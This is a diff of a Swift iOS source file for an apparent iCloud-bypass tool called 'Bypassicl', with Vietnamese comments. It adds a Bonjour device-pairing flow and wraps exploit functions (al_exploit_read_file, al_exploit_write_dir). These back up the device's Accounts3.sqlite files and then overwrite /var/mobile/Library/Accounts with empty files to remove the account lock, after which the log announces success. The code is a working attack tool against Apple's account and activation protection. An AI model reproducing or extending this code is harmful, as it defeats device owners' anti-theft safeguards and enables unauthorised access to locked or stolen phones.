@@ -1,19 +1,26 @@
 import Foundation
 import Combine
+import UniformTypeIdentifiers
 
 class AirliftService: ObservableObject {
     static let shared = AirliftService()
     
     @Published var logs: String = "=== Bypassicl Log ===\n"
+    @Published var isPairing = false
+    @Published var currentPin: String? = nil
+    @Published var pairingFilePath: String? = nil
+    @Published var lastDeviceName: String? = nil
     
     private let accountsDir = "/var/mobile/Library/Accounts"
     private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
     
-    private var pairingPath: String?
-    
     var backupDir: URL {
-        let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
-        return docDir.appendingPathComponent("AccountsBackup")
+        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+            .appendingPathComponent("AccountsBackup")
+    }
+    
+    private var documentsDir: URL {
+        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
     }
     
     private func log(_ message: String) {
@@ -23,38 +30,143 @@ class AirliftService: ObservableObject {
         }
     }
     
-    // Log callback cho AirliftFFI
+    // MARK: - Callbacks
     private static let logCallback: ALLogCallback = { ctx, msg in
-        guard let msg = msg else { return }
-        let str = String(cString: msg)
-        if let ctx = ctx {
-            let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
-            service.log("[Airlift] \(str)")
+        guard let msg = msg, let ctx = ctx else { return }
+        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
+        service.log("[Airlift] \(String(cString: msg))")
+    }
+    
+    private static let pinCallback: ALPairPinCb = { pin, ctx in
+        guard let pin = pin, let ctx = ctx else { return }
+        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
+        let pinStr = String(cString: pin)
+        DispatchQueue.main.async {
+            service.currentPin = pinStr
+            service.log("🔐 PIN: \(pinStr)  →  Vào Settings → Developer → nhập PIN này")
         }
     }
     
-    // MARK: - Chuẩn bị
+    private static let readyCallback: ALPairReadyCb = { ctx, serviceId, port, _, _, _ in
+        guard let ctx = ctx else { return }
+        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
+        let sid = serviceId != nil ? String(cString: serviceId!) : "?"
+        service.log("📡 Bonjour ready: \(sid) : \(port)")
+    }
+    
+    // MARK: - Import Pairing File
+    func importPairingFile(from url: URL) {
+        do {
+            // Bắt đầu access security-scoped resource
+            let accessing = url.startAccessingSecurityScopedResource()
+            defer { if accessing { url.stopAccessingSecurityScopedResource() } }
+            
+            let data = try Data(contentsOf: url)
+            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
+            try data.write(to: dest)
+            
+            DispatchQueue.main.async {
+                self.pairingFilePath = dest.path
+                self.log("✅ Đã import pairing file (\(data.count) bytes)")
+            }
+        } catch {
+            log("❌ Import pairing thất bại: \(error.localizedDescription)")
+        }
+    }
+    
+    // MARK: - Pair on Device (iOS 27) - Bonjour + Unlimited
+    func startPairingOnDevice() {
+        guard !isPairing else { return }
+        
+        isPairing = true
+        currentPin = nil
+        log("[*] Bắt đầu Pair on Device (Bonjour)...")
+        log("👉 Mở Settings → Developer Mode trên iPhone target và chờ PIN")
+        
+        let outPath = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
+        let ctx = Unmanaged.passUnretained(self).toOpaque()
+        
+        DispatchQueue.global(qos: .userInitiated).async {
+            var result = ALPairResult()
+            
+            // port = 0 → OS tự chọn
+            // bind_addr = "0.0.0.0" → listen all interfaces
+            // name/model có thể tùy chỉnh
+            let code = al_pairing_run_host(
+                "0.0.0.0",
+                0,
+                "Bypassicl",
+                "iPhone",
+                outPath,
+                nil,                    // host_alt_irk_hex (lần đầu = nil)
+                AirliftService.readyCallback,
+                AirliftService.pinCallback,
+                ctx,
+                &result
+            )
+            
+            defer { al_pairing_result_free(&result) }
+            
+            DispatchQueue.main.async {
+                self.isPairing = false
+                self.currentPin = nil
+                
+                if code == 0 {
+                    if let path = result.pairing_file_path {
+                        self.pairingFilePath = String(cString: path)
+                        self.log("✅ Pairing thành công!")
+                        self.log("📁 File: \(self.pairingFilePath!)")
+                    }
+                    if let name = result.device_name {
+                        self.lastDeviceName = String(cString: name)
+                        self.log("📱 Device: \(self.lastDeviceName!)")
+                    }
+                } else {
+                    let err = result.error != nil ? String(cString: result.error!) : "unknown"
+                    self.log("❌ Pairing thất bại: \(err)")
+                }
+            }
+        }
+    }
+    
+    func stopPairing() {
+        // al_pairing_run_host là blocking, hiện không có API stop.
+        // Chỉ reset UI state.
+        isPairing = false
+        currentPin = nil
+        log("⏹ Đã hủy trạng thái pairing (host vẫn có thể đang chạy)")
+    }
+    
+    // MARK: - Connect (dùng pairing đã có)
     func connect() -> Bool {
-        log("[*] Đang chuẩn bị...")
+        log("[*] Kiểm tra pairing...")
         
-        // Grappa token (từ GrappaHelper)
-        guard generateGrappaToken() != nil else {
-            log("❌ Không tạo được Grappa Token")
+        if pairingFilePath == nil {
+            // Tự tìm trong Documents
+            let candidates = [
+                "pairingRecord.mobiledevicepairing",
+                "pairingRecord.plist",
+                "pairing.plist"
+            ]
+            for name in candidates {
+                let url = documentsDir.appendingPathComponent(name)
+                if FileManager.default.fileExists(atPath: url.path) {
+                    pairingFilePath = url.path
+                    break
+                }
+            }
+        }
+        
+        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
+            log("❌ Chưa có pairing file. Hãy Pair on Device hoặc Import file.")
             return false
         }
-        log("✅ Grappa Token OK")
         
-        // Pairing file
-        guard let pairing = findPairingFile() else {
-            log("❌ Không tìm thấy pairing file trong Documents")
-            log("👉 Copy file pairingRecord.mobiledevicepairing vào Documents của app")
-            return false
-        }
-        self.pairingPath = pairing
-        log("✅ Pairing: \(pairing)")
+        log("✅ Dùng pairing: \(path)")
         return true
     }
     
+    // MARK: - Grappa (giữ nguyên)
     private func generateGrappaToken() -> Data? {
         let maxLen = 1024
         var buffer = [UInt8](repeating: 0, count: maxLen)
@@ -62,51 +174,24 @@ class AirliftService: ObservableObject {
         var errBuffer = [CChar](repeating: 0, count: 256)
         
         let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)
-        
         if result == 0 {
             return Data(bytes: buffer, count: Int(outLen))
         } else {
-            let msg = String(cString: errBuffer)
-            log("Grappa Error (\(result)): \(msg)")
+            log("Grappa Error (\(result)): \(String(cString: errBuffer))")
             return nil
         }
     }
     
-    private func findPairingFile() -> String? {
-        let doc = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
-        let names = [
-            "pairingRecord.mobiledevicepairing",
-            "pairingRecord.plist",
-            "pairing.plist"
-        ]
-        for name in names {
-            let url = doc.appendingPathComponent(name)
-            if FileManager.default.fileExists(atPath: url.path) {
-                return url.path
-            }
-        }
-        return nil
-    }
-    
-    // MARK: - Đọc file qua exploit
+    // MARK: - FFI helpers
     private func ffi_read_file(_ iosPath: String) -> Data? {
-        guard let pairing = pairingPath else { return nil }
+        guard let pairing = pairingFilePath else { return nil }
         
         var outData: UnsafeMutablePointer<UInt8>? = nil
         var outLen: size_t = 0
         var outError: UnsafeMutablePointer<CChar>? = nil
-        
         let ctx = Unmanaged.passUnretained(self).toOpaque()
         
-        let result = al_exploit_read_file(
-            pairing,
-            iosPath,
-            AirliftService.logCallback,
-            ctx,
-            &outData,
-            &outLen,
-            &outError
-        )
+        let result = al_exploit_read_file(pairing, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
         
         defer {
             if let e = outError { al_string_free(e) }
@@ -115,32 +200,21 @@ class AirliftService: ObservableObject {
         
         guard result == 0, let ptr = outData, outLen > 0 else {
             let err = outError != nil ? String(cString: outError!) : "unknown"
-            log("❌ Đọc thất bại \(iosPath): \(err)")
+            log("❌ Đọc \(iosPath) thất bại: \(err)")
             return nil
         }
-        
         return Data(bytes: ptr, count: Int(outLen))
     }
     
-    // MARK: - Ghi đè thư mục
     private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
-        guard let pairing = pairingPath else { return false }
+        guard let pairing = pairingFilePath else { return false }
         
         var outError: UnsafeMutablePointer<CChar>? = nil
         let ctx = Unmanaged.passUnretained(self).toOpaque()
         
-        let result = al_exploit_write_dir(
-            pairing,
-            sourceDir,
-            targetDir,
-            AirliftService.logCallback,
-            ctx,
-            &outError
-        )
+        let result = al_exploit_write_dir(pairing, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
         
-        defer {
-            if let e = outError { al_string_free(e) }
-        }
+        defer { if let e = outError { al_string_free(e) } }
         
         if result != 0 {
             let err = outError != nil ? String(cString: outError!) : "unknown"
@@ -150,11 +224,10 @@ class AirliftService: ObservableObject {
         return true
     }
     
-    // MARK: - Backup
+    // MARK: - Backup & Bypass
     func backupAccounts() -> Bool {
         log("[*] Backup Accounts...")
-        let fm = FileManager.default
-        try? fm.createDirectory(at: backupDir, withIntermediateDirectories: true)
+        try? FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
         
         var ok = true
         for file in targetFiles {
@@ -167,39 +240,32 @@ class AirliftService: ObservableObject {
                 try data.write(to: backupDir.appendingPathComponent(file))
                 log("✅ Backup \(file) (\(data.count) bytes)")
             } catch {
-                log("❌ Lỗi ghi backup: \(error.localizedDescription)")
+                log("❌ \(error.localizedDescription)")
                 ok = false
             }
         }
         return ok
     }
     
-    // MARK: - Bypass (ghi rỗng)
     func bypassICloud() {
-        log("[*] Bắt đầu Bypass (ghi đè rỗng)...")
-        
+        log("[*] Bypass (ghi đè rỗng)...")
         guard backupAccounts() else {
             log("❌ Hủy vì backup thất bại")
             return
         }
         
-        // Tạo thư mục tạm chứa 3 file rỗng
-        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_accounts_\(UUID().uuidString)")
+        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
         try? FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
         
         for file in targetFiles {
             try? Data().write(to: tmp.appendingPathComponent(file))
         }
         
-        log("[*] Đang ghi đè \(accountsDir) bằng file rỗng...")
-        
         if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
-            log("🎉 BYPASS THÀNH CÔNG!")
-            log("👉 Reboot thiết bị ngay.")
+            log("🎉 BYPASS THÀNH CÔNG! Reboot thiết bị.")
         } else {
             log("❌ Ghi đè thất bại")
         }
-        
         try? FileManager.default.removeItem(at: tmp)
     }
 }
